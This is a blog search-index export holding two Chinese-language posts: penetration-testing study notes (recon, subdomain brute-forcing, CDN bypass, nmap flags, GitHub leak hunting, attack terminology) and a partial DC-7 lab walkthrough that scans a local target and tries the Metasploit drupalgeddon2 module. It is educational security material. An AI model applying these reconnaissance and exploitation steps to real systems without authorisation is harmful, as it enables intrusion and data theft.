<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透测试（一）</title>
    <link href="/2024/07/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/07/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1-渗透测试"><a href="#1-渗透测试" class="headerlink" title="1.渗透测试"></a>1.渗透测试</h1><p><a href="https://blog.csdn.net/lady_killer9/article/details/106791542">网络安全-自学笔记</a></p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="①流程"><a href="#①流程" class="headerlink" title="①流程"></a>①流程</h3><blockquote><p>前期交互</p><p>信息收集</p><p>威胁建模</p><p>漏洞分析</p><p>渗透攻击</p><p>后渗透攻击</p><p>报告</p></blockquote><h3 id="②测试方法"><a href="#②测试方法" class="headerlink" title="②测试方法"></a>②测试方法</h3><blockquote><p>白盒测试：基本从内部发起，通过正常渠道向被测单位获取资料。</p><p>黑盒测试：在授权的情况下，模拟黑客的攻击方法和思维方式，评估安全风险。黑盒测试不同于黑客入侵。</p></blockquote><h2 id="前期交互"><a href="#前期交互" class="headerlink" title="前期交互"></a>前期交互</h2><p>目标：</p><ul><li>确定范围：测试目标的范围、ip、域名、内外网、测试账户。</li><li>确定规则：能渗透到什么程度，所需要的时间，能够执行修改上传，能否提权等。</li><li>确定需求：web应用的漏洞，业务逻辑漏洞，人员权限管理漏洞等。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要收集服务器的配置信息和网站的敏感信息，其中包括：</p><ul><li>域名以及子域名信息</li><li>目标网站系统</li><li>cms指纹</li><li>目标网站真实IP</li><li>开放的端口等。</li></ul><p>信息收集的方式可分为<code>主动</code>和<code>被动</code>两种。</p><p><code>主动信息收集</code>：与目标主机进行直接交互，从而拿到目标信息。（比如黑进目标主机）</p><p><code>被动信息收集</code>：间接交互，通过搜索引擎或社会工程等方式间接获取目标主机上的信息。（比如Google搜索、Shodan搜索等）</p><h3 id="①域名信息的收集"><a href="#①域名信息的收集" class="headerlink" title="①域名信息的收集"></a>①域名信息的收集</h3><p>确定了要渗透的目标，即确定了其域名。</p><p>确定了域名之后还需要确定域名对应的<code>IP地址</code>，域名的<code>whois</code>信息、<code>子域名</code>等一系列与域名相关的信息。</p><h4 id="1、域名的whois信息"><a href="#1、域名的whois信息" class="headerlink" title="1、域名的whois信息"></a>1、域名的whois信息</h4><p><code>whois</code>是用来查询域名的<code>IP地址</code>以及所有者等信息的传输协议。</p><p>通常，执行whois查询的工具是：</p><p><a href="https://www.zhanid.com/tool/whois.html">whois查询工具—站长工具网</a></p><p><a href="https://tools.wujingquan.com/whois/">whois信息查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707164136300.png" alt="image-20240707164136300"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707165721514.png" alt="image-20240707165721514"></p><p>其它的注入阿里云的域名查询在线工具也可以，就是显示出来的信息没有那么集中。</p><p>在kali下，也有默认的<code>whois工具指令</code>。</p><p>查询命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois 域名（.com）<br></code></pre></td></tr></table></figure><h4 id="2、备案信息查询"><a href="#2、备案信息查询" class="headerlink" title="2、备案信息查询"></a>2、备案信息查询</h4><p>ICP备案信息查询。</p><p>查询网址：</p><p><a href="https://icp.chinaz.com/">ICP备案查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134232544.png" alt="image-20240709134232544"></p><p><a href="https://beian.miit.gov.cn/#/Integrated/index">工信部ICP备案查询</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134434241.png" alt="image-20240709134434241"></p><p>可以从中得到一些有关于网址或者域名的一些备案号、主办单位、网站负责人之类的信息。</p><h4 id="3、子域名信息"><a href="#3、子域名信息" class="headerlink" title="3、子域名信息"></a>3、子域名信息</h4><p>查询子域名的几种方法如下：</p><ul><li>Layer子域名爆破机</li></ul><p>Layer是win下的一款子域名探测工具，其工作原理是：利用<code>子域名字典</code>进行爆破。</p><p>输入目标网站的域名即可启动进行字典爆破子域名。如下是访问gxu官网域名爆破得到的子域名结果。</p><p>工具地址：<code>E:\IDEToolsV2\Layer子域名挖掘机4.2纪念版</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709135535182.png" alt="image-20240709135535182"></p><ul><li>subDomainsBurte</li></ul><p>它同样也是一个子域名爆破工具，使用<code>字典暴力</code>破解，并通过<code>DNS解析</code>来确定是否存在有效的子域名。它的特点是可以用小字典递归地发现三级域名、四级域名、甚至是五级域名等不容易被探测到的域名。</p><p>工具下载链接： <a href="https://github.com/lijiejie/subDomainsBrute%EF%BC%88%E5%8F%AF%E4%BD%BF%E7%94%A8pip%E5%AE%89%E8%A3%85%EF%BC%89">https://github.com/lijiejie/subDomainsBrute（可使用pip安装）</a></p><p>也可以在kali下安装使用哦。</p><p>使用默认下载源的话可能速度较慢而且可能会失败，所以我们可以使用镜像源下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple dnspython==2.2.1 async_timeout<br></code></pre></td></tr></table></figure><p>在kali主机内部暂时下载失败。</p><p>通过远程连接下载也是失败：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142722978.png" alt="image-20240709142722978"></p><p>由错误信息可以略知一二，kali系统中本来就有<code>dnspython</code>，所以试图再次下载的时候就会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142938308.png" alt="image-20240709142938308"></p><p>所以就直接先下载那个GitHub文件。</p><p><a href="https://blog.csdn.net/m0_57206390/article/details/133201540">kali 安装使用subDomainsBrute</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/lijiejie/subDomainsBrute.git<br></code></pre></td></tr></table></figure><p>这里远程终端下载一直发生错误，在kali内部尝试访问浏览器，也不行，然后更改了代理设置为使用系统自定义的代理，但是在远程终端还是不行。去到kali本机访问目标链接，发现可以访问到，然后直接在里边下载了。成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150649237.png" alt="image-20240709150649237"></p><p>进入到目标文件夹安装依赖包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install dnspython gevent<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150903081.png" alt="image-20240709150903081"></p><p>启动方式为：进入到<code>subDomainsBrute</code>文件夹下，执行启动代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 subDomainsBrute.py gxu.edu.com（域名）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151237123.png" alt="image-20240709151237123"></p><p>爆破速度远比Layer慢。</p><ul><li>Google查询</li></ul><p>使用语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">site:域名<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151514907.png" alt="image-20240709151514907"></p><p>本来也可以使用<code>FOFA</code>的，但是它并不是免费使用哈哈。</p><h4 id="4、http证书查询"><a href="#4、http证书查询" class="headerlink" title="4、http证书查询"></a>4、http证书查询</h4><p><a href="https://crt.sh/">http证书查询</a></p><p>可以输入域名，查询与其绑定的相关证书信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152136780.png" alt="image-20240709152136780"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152056475.png" alt="image-20240709152056475"></p><h4 id="5、DNS记录查询"><a href="#5、DNS记录查询" class="headerlink" title="5、DNS记录查询"></a>5、DNS记录查询</h4><p>DNS指的是域名解析服务，即将域名与IP之间做相应的转换。</p><blockquote><p>正向解析：根据域名查找对应的IP地址</p><p>反向解析：根据IP地址查找对应的域名</p></blockquote><ul><li><p>kali工具（DNSenum、Fierce、DMitry）</p></li><li><p>在线查询工具：</p><p><a href="http://tool.chinaz.com/dns/">站长工具之DNS查询</a></p><p>查询的效果是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154255324.png" alt="image-20240709154255324"></p><p><a href="https://www.virustotal.com/gui/home/search">国外的DNS查询工具</a></p><p>界面良好直观，而且经过测试应该也是免费的。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154740043.png" alt="image-20240709154740043"></p></li></ul><h4 id="6、判断域名对应的IP地址"><a href="#6、判断域名对应的IP地址" class="headerlink" title="6、判断域名对应的IP地址"></a>6、判断域名对应的IP地址</h4><p>首先需要判断域名是否存在CDN的情况。可以先去在线CDN查询网站进行查询。</p><p><a href="https://ping.chinaz.com/">在线CDN查询</a></p><p>如果输入域名查询得到的IP地址不止一个的话，那就说明该IP地址不是真实的服务器地址。<code>如果是两个或者三个IP地址，并且这些IP地址是同一个地区不同运营商的话，则这些IP地址很有可能是服务器的出口地址，该服务器在内网中</code></p><p>现在下面查询的这个域名，他只有一个对应的IP地址，说明该IP地址就是该域名的真实服务器地址，不存在CDN的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709161318682.png" alt="image-20240709161318682"></p><p>如何绕过CDN查找网站的真实IP呢？</p><ul><li><p>很多时候一些重要的站点会做CDN，但是它旗下的一些子域名站点不会做CDN。可以从子域名切入查找网站的真实IP。<code>启动终端，在终端中使用ping命令。执行 ping 子域名 的命令，ping返回结果中会返回该子域名的IP地址</code>。 </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709162401797.png" alt="image-20240709162401797"></p></li></ul><blockquote><p>CDN（内容分发网络）是构建在现有互联网基础之上的一层智能虚拟网络。</p></blockquote><h3 id="②整站分析"><a href="#②整站分析" class="headerlink" title="②整站分析"></a>②整站分析</h3><p>分析的对象有：</p><ul><li><p>服务器类型：windows、linux</p><blockquote><p>ping探测：win的TLS值一般是128，linux的则一般是64。</p><p>nmap扫描：<code>namp -O/-A IP地址</code>一般都能扫描得出来。</p></blockquote></li><li><p>网站容器：apache、nginx、tomcat、IIS等</p></li><li><p>脚本类型：php、jsp、asp、aspx</p></li><li><p>数据库类型：mysql、oracle、access、sqlserver</p></li></ul><p>在之前进行靶场攻打的过程中，有关于分析网站技术构成的指纹工具（如wappalyzer）就很适合用于整站分析（网站容器、脚本类型、数据库类型）。</p><p><strong>几种数据库的区别：</strong></p><blockquote><ul><li>Access：小型数据库，数据库后缀名：.mdb。一般是asp网页文件使用这个数据库</li><li>SQL Server：比较大型的数据库，端口号为1433，数据库后缀名：.mdf</li><li>MySQL：大部分是PHP页面，默认端口号是3306</li><li>Oracle：常用于比较大型的网站，默认端口是1521</li></ul></blockquote><p>常见搭配：</p><p>asp、aspx：access、sqlserver</p><p>php：mysql、postgreSQL</p><p>jsp：Oracle、mysql</p><h3 id="③企业信息查询"><a href="#③企业信息查询" class="headerlink" title="③企业信息查询"></a>③企业信息查询</h3><p>确认了公司之后，可以去互联网上查询与该公司有关的任何信息。如：企业基本信息、员工信息（手机号、邮箱、姓名、社交账号信息等）、组织框架、企业法人、企业综合信息等。使用社会工程学攻击获取这些信息也不是不行（在合法报备情况下哈）。</p><p><a href="https://www.tianyancha.com/">天眼查</a></p><p><a href="https://www.qcc.com/">企查查</a></p><p>也可以通过之前得ICP备案查询去获取一些信息。</p><h3 id="④GitHub信息收集"><a href="#④GitHub信息收集" class="headerlink" title="④GitHub信息收集"></a>④GitHub信息收集</h3><p>亲测，做毕设的时候在GitHub上找项目，找到了一个包含一万七条的员工入职个人信息。确实有这个必要进行GitHub信息收集。</p><p>主要收集：泄露源码、泄露数据库&#x2F;邮箱&#x2F;ftp&#x2F;ssh&#x2F;3389等账号、泄露的人员信息以及其它敏感信息。</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">信息收集之Github搜索语法</a></p><h3 id="⑤端口扫描"><a href="#⑤端口扫描" class="headerlink" title="⑤端口扫描"></a>⑤端口扫描</h3><h4 id="1、nmap端口扫描"><a href="#1、nmap端口扫描" class="headerlink" title="1、nmap端口扫描"></a>1、nmap端口扫描</h4><ul><li><p>功能：主机发现（检测存活在网络上的主机）、端口发现（检测开放端口）、服务发现（检测端口开放的服务和其版本）、检测操作系统&#x2F;硬件地址&#x2F;软件版本等、检测脆弱性漏洞（<code>--script=vuln</code>）</p></li><li><p>常用命令：</p></li></ul><blockquote><p>-sS：tcp syn扫描</p><p>-p：指定端口号扫描</p><p>-v：显示扫描过程</p><p>-F：快速扫描</p><p>-A：全面扫描</p><p>-Pn：禁止ping后扫描，跳过主机发现的过程进行端口扫描</p><p>-sU：udp扫描</p><p>-sT：tcp扫描</p><p>-sV：扫描系统版本和程序版本号检测</p><p>-n：禁止反向域名解析</p><p>-R：启用反向域名解析</p><p>-6：启用IPV6扫描</p><p>–script&#x3D;vuln：全面的漏洞扫描</p></blockquote><h4 id="2、旁站和c段扫描"><a href="#2、旁站和c段扫描" class="headerlink" title="2、旁站和c段扫描"></a>2、旁站和c段扫描</h4><p>旁站是指和目标网站在同一台服务器上的其它网站。拿webshell，提权，拿下该网站。</p><p>使用IP反查域名搜索旁站：</p><p><a href="http://s.tool.chinaz.com/same">IP反查域名</a></p><p><a href="https://www.aizhan.com/">SEO综合查询·反查域名</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709230713348.png" alt="image-20240709230713348"></p><p>对红蓝对抗和护网，c段扫描比较有意义。c段是指与目标服务器IP处于同一个C段的其它服务器。（192.168.1.0&#x2F;24）</p><h3 id="⑥网站敏感目录和文件"><a href="#⑥网站敏感目录和文件" class="headerlink" title="⑥网站敏感目录和文件"></a>⑥网站敏感目录和文件</h3><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><blockquote><p>后台、robots.txt、数据库.log、sitemap.xml、mysql.sql、licence.txt、Git、hg&#x2F;Mercurial、svn&#x2F;Subversion、bzr&#x2F;Bazaar、Cvs、WEB-INF泄露、备份文件泄露、配置文件泄露。</p></blockquote><ul><li>Cansina</li></ul><p>用于发现网站的敏感目录和内容的安全测试工具，通过分析服务器的响应进行探测并使用sqlite保证数据持久性。</p><p>下载地址：<a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p><ul><li>Githack</li></ul><p>git泄露利用脚本</p><p>下载地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h2 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h2><p>利用上一个信息收集阶段获取的信息进行攻击规划。</p><p>标识目标组织可能存在的漏洞与缺陷，根据威胁模型确定下一步需要搜集的信息和攻击方法。</p><h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><p><a href="https://github.com/Getshell/LinuxTQ">linux提权方法论</a></p><h3 id="①对象"><a href="#①对象" class="headerlink" title="①对象"></a>①对象</h3><h4 id="1、CMS"><a href="#1、CMS" class="headerlink" title="1、CMS"></a>1、CMS</h4><p>内容管理系统，用于快速统一创建网站。许多使用CMS构建的网站均存在着对应的漏洞。比如，WordPress 是著名的个人网站CMS，之前我们进行靶场的攻打的时候发现它存在着不少可以被利用来提权的漏洞。</p><blockquote><p>常见的CMS网站平台有：</p><ul><li>WordPress</li><li>HubSpot</li><li>Joomla</li><li>WooCommerce</li><li>Drupal</li><li>Wix</li><li>BigCommerce</li><li>Shopify</li><li>ghost</li><li>Magento</li><li>Textpattern</li><li>Blogger</li><li>Bitrix24</li><li>TYPO3</li></ul></blockquote><p>可以通过<code>metasploit</code>、<code>searchsploit</code>等来搜索有关特定CMS平台的漏洞并尝试进行利用。</p><h4 id="2、中间件"><a href="#2、中间件" class="headerlink" title="2、中间件"></a>2、中间件</h4><p>中间件是一种独立的系统软件或服务程序，位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯，是连接两个独立应用程序或独立系统的软件。</p><p>常见的中间件有：<code>IIS、apache、ngnix、weblogic等</code>。</p><p>中间件本身并不能用来Getshell或提权。而且其一般不是以root用户启动的。但是，在特定条件下（比如存在一些安全漏洞）可以被利用来实施攻击。</p><blockquote><p>常见的三种架构：</p><ul><li>ASP &#x3D; windows + IIS + SQL Server&#x2F;Access + ASP</li><li>J2EE &#x3D; UNIX + Tomcat + Oracle + JSP</li><li>LAMP &#x3D; Linux + Apache + MySql + php</li></ul></blockquote><h4 id="3、后门"><a href="#3、后门" class="headerlink" title="3、后门"></a>3、后门</h4><p>后门是指黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。</p><p>如何检测机器上的后门，主要是通过后门扫描工具来进行。比如，BackdoorBox、</p><p><a href="https://www.freebuf.com/articles/network/356576.html">常见系统后门技术总结与分析利用</a></p><p>一般来说，我们可以通过植入后门对目标主机进行监控。具体的就先不深入探究了。</p><h4 id="4、webshell"><a href="#4、webshell" class="headerlink" title="4、webshell"></a>4、webshell</h4><p>指网站后门。它通过web服务进行命令执行。</p><h3 id="②目标"><a href="#②目标" class="headerlink" title="②目标"></a>②目标</h3><h4 id="1、Getshell"><a href="#1、Getshell" class="headerlink" title="1、Getshell"></a>1、Getshell</h4><p>即<code>获取目标的命令执行权限</code>。</p><blockquote><p>shell，简单来说就是“为使用者提供操作页面”的命令解释器。</p></blockquote><h4 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h4><p>操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p><a href="https://www.cnblogs.com/sfsec/p/15163907.html">linux提权总结</a></p><h4 id="3、相关术语"><a href="#3、相关术语" class="headerlink" title="3、相关术语"></a>3、相关术语</h4><blockquote><ul><li>肉鸡：被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业，个人，政府等等所有单位。</li><li>抓鸡：利用程序的漏洞，使用自动化方式获取存在漏洞的行为。</li><li>撞库：撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。</li><li>拖库：拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库。</li><li>POC：全称”Proof of Concept”（ 概念验证），常指一段漏洞证明的代码。</li><li>EXP：全称”Exploit”（利用），指利用系统漏洞进行攻击的动作。</li><li>Payload：“有效载荷”，指成功exploit之后，真正在目标系统执行的代码&#x2F;指令。</li><li>ShellCode：“shell代码”，是Payload的一种，因其建立正向&#x2F;反向shell而得名。</li><li>APT攻击：Advanced Persistent Threat ，高级可持续性攻击，是指组织或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。（具有极强的隐蔽性、潜伏期长、持续性强、目标性强）。</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-7</title>
    <link href="/2024/07/30/DC-7/"/>
    <url>/2024/07/30/DC-7/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关靶机对比nmap扫描结果得到：</p><p>记得将攻击主机和目标靶机置于同一种网络模式下</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917100411.png" alt="img"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917123305.png" alt="img"></p><p>可以得到目标靶机的IP地址：<code>192.168.204.136</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="tcp、nmap、服务扫描"><a href="#tcp、nmap、服务扫描" class="headerlink" title="tcp、nmap、服务扫描"></a>tcp、nmap、服务扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -p- 192.168.204.136<br>nmap -sN -p- 192.168.204.136<br>nmap -sV -p- 192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917269117.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917348933.png" alt="img"></p><p>可以看到，开放的端口有：<code>22</code>、<code>80</code>，分别对应ssh远程连接服务和http网页服务。</p><h3 id="端口详细扫描"><a href="#端口详细扫描" class="headerlink" title="端口详细扫描"></a>端口详细扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721917572470.png" alt="img"></p><p>从中得知一些信息，22端口的ssh服务版本号。</p><p>80端口应该对应存在着一个网站，网站使用的框架是CMS Drupal（version 8），还有一些不被允许访问的目录文件：</p><blockquote><p>&#x2F;core&#x2F;、&#x2F;profiles&#x2F;、&#x2F;README.txt、&#x2F;web.config、&#x2F;admin&#x2F;、&#x2F;comment&#x2F;reply&#x2F;、 &#x2F;filter&#x2F;tips 、&#x2F;node&#x2F;add&#x2F; 、&#x2F;search&#x2F;、&#x2F;user&#x2F;register&#x2F;、&#x2F;user&#x2F;password&#x2F; 、&#x2F;user&#x2F;login&#x2F; 、&#x2F;user&#x2F;logout&#x2F;、&#x2F;index.php&#x2F;admin&#x2F; 、&#x2F;index.php&#x2F;comment&#x2F;reply&#x2F;</p></blockquote><p>根据名字可以做一个简要的判断，admin、password、login这些文件可能会有我们Getshell所需要的信息。</p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919457522.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919498472.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919511216.png" alt="img"></p><p>发现很多页面都可能存在csrf漏洞。但是csrf（跨站请求伪造）漏洞不好利用，需要抓取数据包伪造请求。</p><h2 id="网页信息检索"><a href="#网页信息检索" class="headerlink" title="网页信息检索"></a>网页信息检索</h2><p>首先访问目标网站<code>192.168.204.136</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721919720170.png"></p><p>发现网站首页有提示信息：</p><blockquote><p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are. </p><p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p><p>What you will have to do, is to think “outside” the box.</p><p>Way “outside” the box. </p><p>这里提示了，dc-7引入了一些新的概念，想利用爆破或者字典攻击，大概率不会成功。所以我们需要做的就是跳出思维定势，远远跳出思维定势。</p></blockquote><p>而且我们发现目标网站显示出来的网页并没有可以登陆的地方，只有一个搜索框“Search”，尝试在搜索框输入一些信息。比如输入指令<code>ls</code>，会发现它竟然要我们输入密码，这里的密码暂时不知道是不是用于用户身份验证的唯一密码还是对应搜索对象的访问密码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920133750.png" alt="img"></p><p>还记得我们上面通过nmap端口扫描得到的那些目录吗？尝试访问，看看能不能获取什么有效的信息。</p><blockquote><p>&#x2F;core&#x2F;、&#x2F;profiles&#x2F;、&#x2F;README.txt、&#x2F;web.config、&#x2F;admin&#x2F;、&#x2F;comment&#x2F;reply&#x2F;、 &#x2F;filter&#x2F;tips 、&#x2F;node&#x2F;add&#x2F; 、&#x2F;search&#x2F;、&#x2F;user&#x2F;register&#x2F;、&#x2F;user&#x2F;password&#x2F; 、&#x2F;user&#x2F;login&#x2F; 、&#x2F;user&#x2F;logout&#x2F;、&#x2F;index.php&#x2F;admin&#x2F; 、&#x2F;index.php&#x2F;comment&#x2F;reply&#x2F;</p></blockquote><p>访问上述的所有目录文件，大部分都没有返回什么有用的信息，不是由于权限不足被拒绝访问，就是发生了4XX系列的错误。</p><p>唯一有用的是找到了需要输入用户名和密码的登陆界面以及一个密码输入界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920512004.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920483152.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920548271.png" alt="img"></p><p>① <a href="http://192.168.204.136/user/password/">http://192.168.204.136/user/password/</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920724337.png" alt="img"></p><p>② <a href="http://192.168.204.136/user/login/">http://192.168.204.136/user/login/</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721920693292.png" alt="img"></p><h2 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h2><p>使用Metasploit查找有关Drupal的漏洞，前面进行nmap端口扫描的时候我们还知道Drupal的版本号是8，可以添加条件更加精确地找到相关漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search Drupal<br>search Drupal 8<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921400079.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921379143.png" alt="img"></p><p>尝试利用最新的那个高危漏洞<code> exploit/unix/webapp/drupal_drupalgeddon2</code>，并查看其参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921554774.png" alt="img"></p><p>修改可修改的<code>RHOSTS</code>参数值为目标靶机的IP地址，并查看其修改是否成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.136<br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921619643.png" alt="img"></p><p>尝试，是否能成功应用修改。执行<code>run/exploit</code>命令。</p><p>发现，报了<code>Unexpected reply</code>未期望的应答错误，而且最后也没有成功创建session，漏洞利用失败。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721921885749.png" alt="img"></p><p>当然，也可以尝试那个久一点的漏洞，但是很大概率会失败，要是真给你成功了，还说啥远远跳出惯性思维（&#x2F;doge）</p><h2 id="用户账户查找"><a href="#用户账户查找" class="headerlink" title="用户账户查找"></a>用户账户查找</h2><h3 id="数据包搜寻"><a href="#数据包搜寻" class="headerlink" title="数据包搜寻"></a>数据包搜寻</h3><p>对目标网站的关键网页进行抓包，尝试输入命令，看看抓取的数据包的内容组成。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978418020.png" alt="img"></p><p>对网页<a href="http://192.168.204.136/user/password/%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85">http://192.168.204.136/user/password/进行抓包</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721978552370.png" alt="img"></p><p>啊？尝试在上述<code>Username or email address</code>输入用户名<code>admin</code>，执行放行之后会跳转到登陆网页<a href="http://192.168.204.136/user/login/%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%98%BE%E7%A4%BA%EF%BC%9A">http://192.168.204.136/user/login/，并且显示：</a></p><p><code>Further instructions have been sent to your email address.</code></p><p>—— 